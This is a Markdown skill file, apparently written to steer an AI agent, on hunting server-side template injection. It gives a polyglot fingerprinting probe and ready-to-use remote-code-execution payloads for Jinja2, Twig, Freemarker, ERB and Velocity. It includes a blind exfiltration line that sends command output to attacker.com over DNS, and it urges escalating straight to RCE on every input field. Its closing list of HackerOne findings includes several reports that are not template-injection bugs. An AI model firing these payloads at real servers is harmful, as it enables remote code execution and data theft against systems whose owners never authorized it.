---
name: hunt-ssti
description: Server-side template injection hunting — template engine fingerprinting (Jinja2/Twig/Freemarker/Velocity/Mako/ERB/Thymeleaf) with engine-differentiating probes, sandbox escapes to RCE, CMS template-editor quirks (preview vs save, query-param record id), blind RCE via OOB popen, JSON-vs-form false negatives. Use when template-like fields (name, bio, email template, PDF generator, reflected URL path) exist. Trigger keywords: SSTI, template injection, Jinja2, Twig, Freemarker, Thymeleaf, sandbox escape.
---

# Server-Side Template Injection — Deep Hunting

## THE GATE
Escalate straight to RCE; arithmetic is only a fingerprint and fails silently when output lands in an HTML attribute context (false negative despite injection).

## Fingerprint BEFORE firing RCE (polyglot probe)
```
{{7*7}}${7*7}#{7*7}<%=7*7 %>*{7*7}
```
| Response | Engine |
|---|---|
| `49` on `{{7*7}}` | Jinja2/Twig |
| `49` on `${7*7}` | Freemarker/Velocity/Mako |
| `49` on `<%=7*7 %>` | ERB |
| `49` on `*{7*7}` | Thymeleaf |
| `{{7*'7'}}` → `7777777` | Jinja2 (string repetition) |
| `{{7*'7'}}` → `49` | Twig (numeric coercion) |

## RCE Payloads (per engine)
- **Jinja2**: `{{config.__class__.__init__.__globals__['os'].popen('id').read()}}`
- **Jinja2 sandbox escape**: `{% for x in range(1) %}{{ lipsum.__globals__.os.popen('id').read() }}{% endfor %}`
- **Twig**: `{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}`
- **Freemarker**: `<#assign ex="freemarker.template.utility.Execute"?new()>${ ex("id") }`
- **ERB**: `<%= \`id\` %>`
- **Velocity**: `$e.getClass().forName("java.lang.Runtime")...`
- **Blind**: `popen('nslookup $(id).attacker.com')` → OOB DNS.

## CMS Template-Editor Quirks
Record id is a **QUERY param** (`?productId=N`), body carries only `csrf`, `template`, `template-action=preview|save`. Always re-fetch fresh CSRF; iterate with `preview` (non-persisting), switch to `save` only when payload is right.

## JSON-vs-Form Trap
Form endpoints MUST use form-encoding — JSON bodies are silently ignored by `request.form['field']`, producing a plausible 200 false-negative.

## Validation
Command output (`uid=N`) or OOB DNS marker required. `{{7*7}}`→49 inside a sandboxed engine = Medium SSTI, **not** Critical RCE.

## Common Mistakes
Assuming Jinja2 without fingerprinting (Freemarker ignores `{{}}`); sending JSON to form endpoints; stopping at arithmetic; calling sandboxed eval "RCE."

## PARAMETER COVERAGE — probe EVERY field (MANDATORY)
The #1 miss: testing only name/bio/email fields and skipping IDs, slugs, error
fields, query params, headers, and format tokens. SSTI hides in any field that
ends up inside a template string server-side.

1. **Enumerate** every user-controlled input: profile/name/bio/description
   fields, email template fields, search/query/error params, path segments,
   ID/slug params, `?template=`/`?view=`-style params, PDF/report generator
   inputs, headers that get interpolated (email headers, page titles).
2. **Fire the polyglot probe on EVERY field**: `{{7*7}}${7*7}#{7*7}<%=7*7 %>*{7*7}`
   and the string-multiply disambiguator `{{7*'7'}}`. Any output change (49,
   7777777, or the literal echoed) marks a candidate — then fingerprint engine
   and escalate.
3. **Watch for blind/no-output fields too**: arithmetic may vanish if the
   output lands in an attribute/JS context — use OOB `popen('nslookup
   $(id).<collab>')` payloads on fields with NO visible reflection.
4. **Form vs JSON trap**: form endpoints MUST get form-encoded payloads; JSON
   bodies silently ignored. Sweep each field in BOTH encodings when unsure.
5. **Re-sweep on preview AND save** (CMS template editors: query-param record
   id, body carries template; preview is non-persisting — use it to test first).
6. **Track** `endpoint → field → probe → result` in the journal; every
   unlogged field = gap.

## FIELD DATA — mined from HackerOne disclosed reports (10k-report corpus)

### Class: ssti — 21 disclosed H1 reports (12 High/Critical)

**Parameters seen in real findings** (recurring; test each on every endpoint):

- `error`
- `deviceUdid`
- `dag_id`
- `userid`
- `pw`
- `name`
- `Search`
- `url`
- `client_id`
- `scope`

**Representative finding shapes** (real report titles, genericized — use as test-case ideas, not templates):

- **[critical] Handling of `tracking` command allows making arbitrary blind requests with user's cookies from Grammarly Extension's origin** (None)
  - Signal: ## **Summary:** Attacker could trigger Grammarly extension's `gnar._fetch` command using a crafted page to perform XHR with cookies and any configurational params to any cross-orig
- **[critical] ██████████ vulnerable to CVE-2022-22954** (Code Injection)
  - Signal: I found that one of the targets belongs to **DOD** vulnerable to **CVE-2022-22954** where an attacker may be able to execute any malicious code like escalating Remote code executio
- **[critical] ███ vulnerable to CVE-2022-22954** (Code Injection)
  - Signal: I found that one of the targets belongs to DOD vulnerable to CVE-2022-22954 where an attacker may be able to execute any malicious code like escalating Remote code execution is als
- **[critical] HEY.com email stored XSS** (Cross-site Scripting (XSS) - Stored)
  - Signal: An attacker can bypass the HEY.com HTML sanitizer and inject arbitrary unsafe HTML in emails. To reproduce the bug you have to send raw HTML-formatted email. You can do it e.g. wit

